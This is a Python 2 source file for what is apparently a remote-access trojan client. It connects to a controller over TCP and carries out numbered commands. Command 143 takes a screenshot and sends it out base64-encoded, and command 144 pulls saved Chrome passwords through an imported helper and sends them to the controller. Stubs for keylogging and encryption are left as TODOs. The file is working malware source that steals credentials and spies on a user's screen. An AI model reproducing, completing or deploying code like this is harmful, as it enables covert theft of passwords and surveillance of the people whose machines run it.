import socket
import signal
import sys
import threading, time
from Queue import Queue
import passwords
import base64
from PIL import ImageGrab

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)

class Client:

    def __init__(self,ip='localhost',port=5715):
        self.messageQ = Queue()

        TCP_IP = ip
        TCP_PORT = port

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((TCP_IP, TCP_PORT))

    def run(self):

        threading.Thread(target=self.dequeue).start()

        while True:
            size = self.getSizeOfCommand()
            data = self.s.recv(size)
            if not data:
                break
            if data == "100":
                print "hello"
            elif data == "143":
                threading.Thread(target=self.screenshot).start()
            elif data == "144":
                threading.Thread(target=self.passwords).start()
            elif data == "145":
                print "last thing"
            else:
                print "i don't know that command"
        self.s.close()

    def getSizeOfCommand(self):
        sizearray = []
        size = 1
        data = self.s.recv(1)
        if data == "!":
            data = None
            while data != "!":
                data = self.s.recv(size)
                if data != "!" and data != "\n":
                    sizearray.append(data)
        size = 0
        for i in range(0,len(sizearray)):
            size += int(sizearray[i]) * pow(10,len(sizearray)-i-1)
        return size

    def screenshot(self):
        #TODO: Fill this in
        ImageGrab.grab().save("C:\Users\Matt\Desktop\scrnsht.png", "PNG")
        # img = ImageGrab.grab()
        f = open('C:\Users\matt\Desktop\scrnsht.png', 'rb')
        fread = f.read()
        imgstr = base64.b64encode(fread)
        size = str(len(imgstr))
        data = imgstr
        self.enqueue(size,data)

    def keylog(self):
        #TODO: Fill this in
        return

    def encrypt(self):
        #TODO: Fill this in
        return

    def passwords(self):
        #TODO: Fill this in
        message = passwords.getChromePasswords()
        data = "\n".join(message)
        self.enqueue(len(data),data)

    def enqueue(self,size,data):
        self.messageQ.put((size,data))

    def dequeue(self):
        while True:
            data = self.messageQ.get()
            self.sendMessage(data[0],data[1])

    def sendMessage(self,size,data):
        self.s.send("!" + str(size) + "!" + data)


def main():
    c = Client()
    c.run()

if __name__ == '__main__':
    #signal handlers
    signal.signal(signal.SIGINT, signal_handler)

    #run the program
    main()